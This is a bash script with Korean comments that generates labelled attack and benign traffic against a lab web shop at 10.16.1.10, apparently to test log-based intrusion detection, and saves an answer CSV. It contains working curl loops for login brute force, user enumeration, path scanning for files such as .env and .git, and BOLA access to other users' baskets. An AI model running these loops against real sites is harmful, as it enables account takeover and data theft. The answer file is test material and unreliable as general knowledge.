#!/usr/bin/env bash
# 타겟(10.16.1.10)에서 실행. 공격 IP 별칭을 붙여 다종 공격을 '동시에' 생성(현실적),
# 정상도 섞어 흘린다. 각 공격 IP/종류/시작·끝을 answer 로 남긴다. nginx 가 remote_addr=별칭 으로 로그.
set -u
BASE="http://10.16.1.10"
DEV=$(ip route | awk '/default/{print $5; exit}')
ANS=/root/real_answer.csv
echo "ip,label,type" > "$ANS"
ALIASES=""

add(){ ip addr add "$1/24" dev "$DEV" 2>/dev/null; ALIASES="$ALIASES $1"; }
U(){ date -u +%FT%TZ; }
rec(){ echo "$1,attack,$2" >> "$ANS"; }   # ip,label,type (IP 전용이라 IP형 정답지)

# --- 공격 IP 별칭 ---
for ip in 221 222 223 224 225 226 227; do add 10.16.1.$ip; done

# --- 로그인 토큰(bola용, best-effort) ---
login(){
  local ip=$1 email="bola_$1@lab.test" pw="BolaPass!2026"
  curl -s --interface "$ip" -X POST "$BASE/api/Users" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$email\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"x\"}" >/dev/null 2>&1
  curl -s --interface "$ip" -X POST "$BASE/rest/user/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$email\",\"password\":\"$pw\"}" 2>/dev/null | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

echo "[$(U)] 공격 시작"

# 1) brute_fast .221
( for i in $(seq 1 150); do curl -s -o /dev/null --interface 10.16.1.221 -X POST "$BASE/rest/user/login" \
    -H 'Content-Type: application/json' -d "{\"email\":\"a@b.c\",\"password\":\"w$i\"}"; sleep 0.4; done ) &
rec 10.16.1.221 brute_fast

# 2) brute_slow .222 (느린 대입 — 여러 구간에 걸침)
( for i in $(seq 1 28); do curl -s -o /dev/null --interface 10.16.1.222 -X POST "$BASE/rest/user/login" \
    -H 'Content-Type: application/json' -d "{\"email\":\"a@b.c\",\"password\":\"w$i\"}"; sleep 18; done ) &
rec 10.16.1.222 brute_slow

# 3) harvest .223
( end=$(( $(date +%s)+120 )); while [ $(date +%s) -lt $end ]; do
    curl -s -o /dev/null --interface 10.16.1.223 "$BASE/api/Products"
    curl -s -o /dev/null --interface 10.16.1.223 "$BASE/rest/products/$((RANDOM%30+1))/reviews"; done ) &
rec 10.16.1.223 harvest

# 4) user_enum .224
( for r in 1 2 3; do for u in $(seq 1 60); do
    curl -s -o /dev/null --interface 10.16.1.224 "$BASE/api/Users/$u"; sleep 0.4; done; done ) &
rec 10.16.1.224 user_enum

# 5) scanning .225 (404 폭증)
( paths="admin backup .git config phpmyadmin old wp-login .env"; for r in $(seq 1 120); do
    p=$(echo $paths | tr ' ' '\n' | shuf -n1); curl -s -o /dev/null --interface 10.16.1.225 "$BASE/$p/$r"; sleep 0.3; done ) &
rec 10.16.1.225 scanning

# 6) bola_fast .226
( T=$(login 10.16.1.226); for id in $(shuf -i 1-60 -n 60); do
    curl -s -o /dev/null --interface 10.16.1.226 "$BASE/rest/basket/$id" -H "Authorization: Bearer $T"
    curl -s -o /dev/null --interface 10.16.1.226 "$BASE/api/BasketItems/$id" -H "Authorization: Bearer $T"; sleep 0.3; done ) &
rec 10.16.1.226 bola_fast

# 7) bola_slow .227 (느린 BOLA — H5 핵심)
( T=$(login 10.16.1.227); for id in $(shuf -i 1-40 -n 40); do
    curl -s -o /dev/null --interface 10.16.1.227 "$BASE/rest/basket/$id" -H "Authorization: Bearer $T"; sleep 15; done ) &
rec 10.16.1.227 bola_slow

# --- 정상도 동시에 (.101~106, 이미 별칭) ---
for nip in 101 102 103 104 105 106; do
( end=$(( $(date +%s)+480 )); while [ $(date +%s) -lt $end ]; do
    case $((RANDOM%4)) in
      0) curl -s -o /dev/null --interface 10.16.1.$nip "$BASE/rest/products/search?q=apple";;
      1) curl -s -o /dev/null --interface 10.16.1.$nip "$BASE/api/Products";;
      2) curl -s -o /dev/null --interface 10.16.1.$nip "$BASE/rest/products/$((RANDOM%20+1))/reviews";;
      3) curl -s -o /dev/null --interface 10.16.1.$nip "$BASE/";;
    esac; sleep $((RANDOM%6+2)); done ) &
done

wait
echo "[$(U)] 전부 종료"
# 별칭 정리(공격용만; 정상 .101~106 은 원래 있던 것이라 둠)
for ip in $ALIASES; do ip addr del "$ip/24" dev "$DEV" 2>/dev/null; done
echo "정답지:"; cat "$ANS"
